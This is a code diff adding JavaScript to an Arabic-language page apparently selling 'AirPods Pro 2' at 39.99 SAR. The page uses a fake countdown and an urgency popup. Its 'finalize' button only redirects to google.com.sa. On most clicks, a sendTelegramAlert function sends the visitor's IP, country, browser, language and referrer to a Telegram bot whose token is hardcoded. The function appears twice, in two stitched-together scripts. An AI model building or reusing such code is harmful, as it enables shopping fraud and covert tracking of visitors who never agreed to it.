+            ipInfo.ip = 'Fetch error';
+        }
+
+        const emojiMap = {
+            'finalize': '💳', 'finaliser': '💳', 'إتمام الطلب': '💳',
+            'cart': '🛒', 'panier': '🛒', 'order modal opened': '🛒', 'تمت إضافة المنتج للسلة': '🛒', 'فتح نافذة الطلب': '🛒',
+            'detail': 'ℹ️', 'عرض التفاصيل': 'ℹ️', 'عرض تفاصيل المنتج': 'ℹ️',
+            // 'page': '📄', 'view': '📄', 'loaded': '📄', 'تم تحميل الصفحة': '📄', // Page load handled by new script
+            'color': '🎨', 'تغيير اللون': '🎨',
+            'popup': '⏳', 'timed offer popup shown': '⏳', 'ظهور نافذة العرض الموقت': '⏳',
+            'timed popup order': '🎉', 'طلب من نافذة العرض الموقت': '🎉',
+            'policy': '🔗', 'nav link clicked': '🔗', 'navigation menu toggled': '🔗', 'فتح نافذة سياسة': '🔗', 'النقر على رابط التنقل': '🔗', 'تبديل قائمة التنقل': '🔗'
+        };
+        let emoji = '🔔'; 
+        for (const key in emojiMap) {
+            if (new RegExp(key, 'i').test(action)) {
+                emoji = emojiMap[key];
+                break;
+            }
+        }
+        
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+
+        let msg = `${emoji} <b>الإجراء:</b> ${action}\n`; 
+        msg += `🌍 <b>الدولة:</b> ${ipInfo.country_name} (${ipInfo.country_code})\n`; 
+        msg += `🌐 <b>IP:</b> ${ipInfo.ip}\n`;
+        msg += `🏙️ <b>المدينة:</b> ${ipInfo.city} | <b>المنطقة:</b> ${ipInfo.region_name}\n`; 
+        msg += `📱 <b>المتصفح:</b> ${userAgent}\n`; 
+        msg += `🗣️ <b>اللغة:</b> ${language}\n`; 
+        msg += `🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`; 
+        msg += `🔗 <b>الرابط:</b> ${window.location.href}\n`; 
+        if (document.referrer) msg += `↩️ <b>المصدر:</b> ${document.referrer}\n`; 
+        
+        if (details && Object.keys(details).length) {
+            msg += `\n📋 <b>التفاصيل:</b>\n`; 
+            Object.keys(details).forEach(key => {
+                const value = typeof details[key] === 'string' ? details[key].replace(/</g, "&lt;").replace(/>/g, "&gt;") : JSON.stringify(details[key]);
+                msg += ` - ${key}: ${value}\n`;
+            });
+        }
+
+        try {
+            await fetch(`https://api.telegram.org/bot${MAIN_TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: MAIN_TELEGRAM_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error("Error sending MAIN Telegram alert:", error);
+        }
+    }
+    
+    // --- Global Flags for Timed Popup Logic ---
+    let mainOrderButtonClicked = false;
+    let timedPopupTimeoutId = null;
+
+
+    // --- DOM Element Declarations (from user's script) ---
+    const logoArea = document.getElementById('logoArea'); 
+    const topNavMenu = document.getElementById('topNavMenu');
+    const navLinks = document.querySelectorAll('.nav-link');
+    const mainHeader = document.getElementById('mainHeader'); 
+
+    const logoImg1 = document.getElementById('logoImg1');
+    const logoImg2 = document.getElementById('logoImg2');
+    const mainTimerDisplay = document.getElementById('timer');
+    const orderBtn = document.getElementById('orderBtn');
+    const floatingOrderBtn = document.getElementById('floatingOrderBtn');
+    const mainModal = document.getElementById('modal');
+    const closeModalBtn = document.getElementById('closeModal');
+    const cartBar = document.getElementById('cartBar');
+    const cartBarAirpodsImg = document.getElementById('cartBarAirpodsImg');
+    const finalizeBtn = document.getElementById('finalizeBtn');
+    const colorRadios = document.querySelectorAll('input[name="color"]');
+    const popupAirpodsImg = document.getElementById('popupAirpodsImg');
+    const loadingPopup = document.getElementById('loadingPopup');
+    const detailsBtn = document.getElementById('detailsBtn');
+    const featuresSection = document.getElementById('features-section'); 
+    const reviewsSectionForNav = document.getElementById('reviews-section'); 
+    const currentYearSpan = document.getElementById('currentYear');
+
+    const timedPopupModal = document.getElementById('timedPopupModal');
+    const timedPopupCloseBtn = document.getElementById('timedPopupCloseBtn');
+    const timedPopupOrderBtn = document.getElementById('timedPopupOrderBtn');
+    const timedPopupTimerDisplay = document.getElementById('timedPopupTimerDisplay');
+
+    const aboutLink = document.getElementById('about-link');
+    const privacyLink = document.getElementById('privacy-link');
+    const termsLink = document.getElementById('terms-link');
+    const supportLink = document.getElementById('support-link');
+    const contactLink = document.getElementById('contact-link');
+    const aboutPage = document.getElementById('about-page');
+    const privacyPage = document.getElementById('privacy-page');
+    const termsPage = document.getElementById('terms-page');
+    const supportPage = document.getElementById('support-page');
+    const contactPage = document.getElementById('contact-page');
+    const featureImages = document.querySelectorAll('.features-img');
+
+
+    // --- Top Navigation Menu Logic ---
+    if (logoArea && topNavMenu) {
+        logoArea.onclick = function() {
+            topNavMenu.classList.toggle('nav-open');
+            sendTelegramAlert('تبديل قائمة التنقل', { state: topNavMenu.classList.contains('nav-open') ? 'مفتوحة' : 'مغلقة' });
+        };
+    }
+
+    navLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            const targetId = this.getAttribute('href');
+            sendTelegramAlert('النقر على رابط التنقل', { link: targetId });
+            if (targetId === '#home') {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else {
+                const targetSection = document.querySelector(targetId);
+                if (targetSection) {
+                    const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
+                    const elementPosition = targetSection.getBoundingClientRect().top + window.scrollY;
+                    const offsetPosition = elementPosition - headerOffset - 20; 
+                    window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
+                }
+            }
+            if (topNavMenu) topNavMenu.classList.remove('nav-open');
+        });
+    });
+
+    // --- Logo Animation ---
+    let currentAnimatedLogo = 1;
+    if (logoImg1 && logoImg2) {
+        setInterval(() => {
+            if (currentAnimatedLogo === 1) {
+                logoImg1.classList.remove('active');
+                logoImg2.classList.add('active');
+                currentAnimatedLogo = 2;
+            } else {
+                logoImg2.classList.remove('active');
+                logoImg1.classList.add('active');
+                currentAnimatedLogo = 1;
+            }
+        }, 3000);
+    }
+
+    // --- Main Timer ---
+    let totalSeconds = (2 * 60 * 60) + (30 * 60);
+    let mainTimerInterval;
+
+    function formatTime(seconds) {
+        let h = String(Math.floor(seconds / 3600)).padStart(2, "0");
+        let m = String(Math.floor((seconds % 3600) / 60)).padStart(2, "0");
+        let s = String(seconds % 60).padStart(2, "0");
+        return `${h}:${m}:${s}`;
+    }
+
+    function updateMainTimer() {
+        if (mainTimerDisplay) {
+            mainTimerDisplay.textContent = formatTime(totalSeconds);
+        }
+        if (timedPopupModal && timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
+            timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
+        }
+
+        if (totalSeconds > 0) {
+            totalSeconds--;
+        } else {
+            clearInterval(mainTimerInterval);
+            if (mainTimerDisplay) mainTimerDisplay.textContent = "انتهى!";
+            if (timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
+                 timedPopupTimerDisplay.textContent = "انتهى!";
+            }
+            if(orderBtn) orderBtn.disabled = true;
+            if(floatingOrderBtn) floatingOrderBtn.disabled = true;
+            if(timedPopupOrderBtn) timedPopupOrderBtn.disabled = true;
+        }
+    }
+
+    if (mainTimerDisplay) {
+        updateMainTimer();
+        mainTimerInterval = setInterval(updateMainTimer, 1000);
+    }
+
+    // --- Timed Pop-up Modal Logic (Corrected) ---
+    let timedPopupShownThisSession = false; 
+
+    function showTimedPopup() {
+        if (timedPopupModal && !timedPopupShownThisSession && !mainOrderButtonClicked) {
+            timedPopupModal.classList.add('show');
+            timedPopupShownThisSession = true;
+            if (timedPopupTimerDisplay) {
+                timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
+            }
+            sendTelegramAlert('ظهور نافذة العرض الموقت');
+        }
+    }
+
+    function closeTimedPopup() {
+        if (timedPopupModal) {
+            timedPopupModal.classList.remove('show');
+        }
+    }
+
+    if (timedPopupModal) {
+        timedPopupTimeoutId = setTimeout(showTimedPopup, 10000); 
+        if (timedPopupCloseBtn) {
+            timedPopupCloseBtn.onclick = closeTimedPopup;
+        }
+        if (timedPopupOrderBtn) {
+            timedPopupOrderBtn.onclick = function() {
+                closeTimedPopup();
+                openOrderModal(); 
+                sendTelegramAlert('طلب من نافذة العرض الموقت');
+            };
+        }
+    }
+
+    // --- Sticky/Floating Order Button Logic ---
+    let originalOrderBtnOffsetTop = 0;
+    if (orderBtn) {
+        setTimeout(() => {
+            if(orderBtn) { 
+               originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+            }
+        }, 100);
+    }
+
+
+    function handleScroll() {
+        if (floatingOrderBtn && orderBtn && originalOrderBtnOffsetTop > 0) {
+            const shouldBeVisible = window.scrollY > originalOrderBtnOffsetTop + orderBtn.offsetHeight;
+            const isVisible = floatingOrderBtn.classList.contains('visible');
+
+            if (shouldBeVisible && !isVisible) {
+                floatingOrderBtn.style.display = 'block'; 
+                requestAnimationFrame(() => { 
+                    floatingOrderBtn.classList.add('visible');
+                });
+            } else if (!shouldBeVisible && isVisible) {
+                floatingOrderBtn.classList.remove('visible');
+                setTimeout(() => {
+                    if (!floatingOrderBtn.classList.contains('visible')) {
+                        floatingOrderBtn.style.display = 'none';
+                    }
+                }, 400); 
+            }
+        }
+    }
+    window.addEventListener('scroll', handleScroll);
+    if (orderBtn) { 
+        handleScroll();
+    }
+
+
+    // --- Main Order Modal & Cart Logic (Corrected for Timed Popup) ---
+    const colorImageSources = {
+        blanc: "https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg",
+        noir: "https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg"
+    };
+
+    function openOrderModal() {
+        mainOrderButtonClicked = true; 
+        if (timedPopupTimeoutId) { 
+            clearTimeout(timedPopupTimeoutId); 
+            timedPopupTimeoutId = null; 
+        }
+
+        if (mainModal && cartBar && cartBarAirpodsImg && popupAirpodsImg) {
+            mainModal.style.display = "flex";
+            cartBar.classList.add("show-cart-bar");
+            const selectedColor = document.querySelector('input[name="color"]:checked').value;
+            cartBarAirpodsImg.src = colorImageSources[selectedColor];
+            popupAirpodsImg.src = colorImageSources[selectedColor];
+            sendTelegramAlert('فتح نافذة الطلب / إضافة للسلة', { product: 'AirPods Pro 2', price: '39.99 ر.س', initialColor: selectedColor === 'blanc' ? 'أبيض' : 'أسود' });
+        }
+    }
+
+    if (orderBtn) {
+        orderBtn.onclick = openOrderModal;
+    }
+    if (floatingOrderBtn) {
+        floatingOrderBtn.onclick = openOrderModal;
+    }
+
+    if (closeModalBtn && mainModal) {
+        closeModalBtn.onclick = function() {
+            mainModal.style.display = "none";
+        };
+    }
+    
+    if (mainModal) {
+        mainModal.addEventListener('click', function(event) {
+            if (event.target === mainModal) { 
+                mainModal.style.display = 'none';
+            }
+        });
+    }
+
+
+    if (finalizeBtn && mainModal && loadingPopup) {
+        finalizeBtn.onclick = function() {
+            const selectedColor = document.querySelector('input[name="color"]:checked').value;
+            mainModal.style.display = "none";
+            loadingPopup.style.display = "flex";
+            sendTelegramAlert('إتمام الطلب (AirPods Pro 2)', { selectedColor: selectedColor === 'blanc' ? 'أبيض' : 'أسود', quantity: 1 });
+            setTimeout(() => {
+                window.location.href = "https://www.google.com.sa"; 
+            }, 3000);
+        };
+    }
+
+    if (colorRadios.length && popupAirpodsImg && cartBarAirpodsImg) {
+        colorRadios.forEach(radio => {
+            radio.addEventListener('change', function() {
+                if (this.checked) {
+                    const selectedColorValue = this.value;
+                    if (popupAirpodsImg) popupAirpodsImg.src = colorImageSources[selectedColorValue];
+                    if (cartBarAirpodsImg) cartBarAirpodsImg.src = colorImageSources[selectedColorValue];
+                    sendTelegramAlert('تغيير اللون (AirPods Pro 2)', { newColor: selectedColorValue === 'blanc' ? 'أبيض' : 'أسود' });
+                }
+            });
+        });
+    }
+
+    // --- Other UI Interactions ---
+    if (detailsBtn && featuresSection) {
+        detailsBtn.onclick = function() {
+            const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
+            const elementPosition = featuresSection.getBoundingClientRect().top + window.scrollY;
+            const offsetPosition = elementPosition - headerOffset - 20; 
+            window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
+            sendTelegramAlert('عرض تفاصيل المنتج (AirPods Pro 2)');
+        }
+    }
+
+    if (currentYearSpan) {
+        currentYearSpan.textContent = new Date().getFullYear();
+    }
+
+    function setupModalLink(linkEl, pageEl, modalName) { 
+        if (linkEl && pageEl) {
+            linkEl.onclick = (e) => { 
+                e.preventDefault(); 
+                pageEl.style.display = 'flex'; 
+                sendTelegramAlert('فتح نافذة سياسة', { modal: modalName });
+            };
+            const policyCloseBtn = pageEl.querySelector('.policy-content .close-btn');
+            if (policyCloseBtn) {
+                policyCloseBtn.onclick = () => { pageEl.style.display = 'none'; };
+            }
+        }
+    }
+
+    setupModalLink(aboutLink, aboutPage, 'من نحن');
+    setupModalLink(privacyLink, privacyPage, 'سياسة الخصوصية');
+    setupModalLink(termsLink, termsPage, 'الشروط والأحكام');
+    setupModalLink(supportLink, supportPage, 'الدعم الفني');
+    setupModalLink(contactLink, contactPage, 'اتصل بنا');
+
+    document.querySelectorAll('.policy-modal').forEach(modal => {
+        modal.addEventListener('click', function(event) {
+            if (event.target === this) {
+                this.style.display = 'none';
+            }
+        });
+    });
+
+    featureImages.forEach(img => {
+        img.onerror = function() {
+            this.src='https://placehold.co/800x600/cccccc/ffffff?text=صورة+غير+متوفرة&font=tajawal';
+            this.alt='صورة الميزة غير متوفرة';
+        };
+    });
+
+    // Initial Page Load Tracking handled by the new dedicated script below
+    window.addEventListener('load', () => {
+        // The main script no longer sends its own "Page Loaded" alert.
+        // It's handled by the new script.
+        if (orderBtn) { 
+            setTimeout(() => {
+                if(orderBtn) { 
+                    originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+                }
+                handleScroll(); 
+            }, 200); 
+        }
+    });
+    </script>
+
+    <script>
+    // --- Telegram Alert Configuration & Function ---
+    const TELEGRAM_BOT_TOKEN = '8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8';
+    const TELEGRAM_CHAT_ID = '-4913064483';
+
+    async function sendTelegramAlert(action, details = {}) {
+let ipInfo = { 
+    ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
+    city: 'N/A', region_name: 'N/A' 
+};
+try {
+    const ipRes = await fetch('https://api.country.is/');
+    if (ipRes.ok) {
+        const data = await ipRes.json();
+        ipInfo = { 
+            ip: data.ip || 'N/A', 
+            country_name: data.country || 'N/A', // رمز الدولة مثل FR أو DZ
+            country_code: data.country || 'N/A', 
+            city: 'N/A', // هذه الخدمة لا تعطي المدينة
+            region_name: 'N/A'
+        };
+    } else {
+        ipInfo.ip = `HTTP Error ${ipRes.status}`;
+    }
+} catch (e) {
+    ipInfo.ip = 'Exception during fetch';
+}
+
+
+        let emoji = '🔔'; // Default
+        if (/finaliser/i.test(action) || /finalize/i.test(action)) emoji = '💳';
+        else if (/cart/i.test(action) || /panier/i.test(action) || /order modal opened/i.test(action)) emoji = '🛒';
+        else if (/detail/i.test(action)) emoji = 'ℹ️';
+        else if (/page/i.test(action) || /view/i.test(action) || /loaded/i.test(action)) emoji = '📄';
+        else if (/color changed/i.test(action)) emoji = '🎨';
+        else if (/timed offer popup shown/i.test(action)) emoji = '⏳';
+        else if (/timed popup order/i.test(action)) emoji = '🎉';
+        else if (/policy modal opened/i.test(action) || /nav link clicked/i.test(action) || /navigation menu toggled/i.test(action) ) emoji = '🔗';
+
+
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+
+        let msg = `${emoji} <b>Action:</b> ${action}\n`;
+        msg += `🌍 <b>Pays:</b> ${ipInfo.country_name} (${ipInfo.country_code})\n`;
+        msg += `🌐 <b>IP:</b> ${ipInfo.ip}\n`;
+        msg += `🏙️ <b>Ville:</b> ${ipInfo.city} | <b>Région:</b> ${ipInfo.region_name}\n`;
+        msg += `📱 <b>Agent:</b> ${userAgent}\n`;
+        msg += `🗣️ <b>Langue:</b> ${language}\n`;
+        msg += `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;
+        msg += `🔗 <b>URL:</b> ${window.location.href}\n`;
+        if (document.referrer) msg += `↩️ <b>Referrer:</b> ${document.referrer}\n`;
+        
+        if (details && Object.keys(details).length) {
+            msg += `\n📋 <b>Détails:</b>\n`;
+            Object.keys(details).forEach(key => {
+                const value = typeof details[key] === 'string' ? details[key].replace(/</g, "&lt;").replace(/>/g, "&gt;") : JSON.stringify(details[key]);
+                msg += ` - ${key}: ${value}\n`;
+            });
+        }
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error("Error sending Telegram alert:", error);
+        }
+    }
+    // --- End Telegram Alert Function ---
+    </script>
+    </body>
 </html>
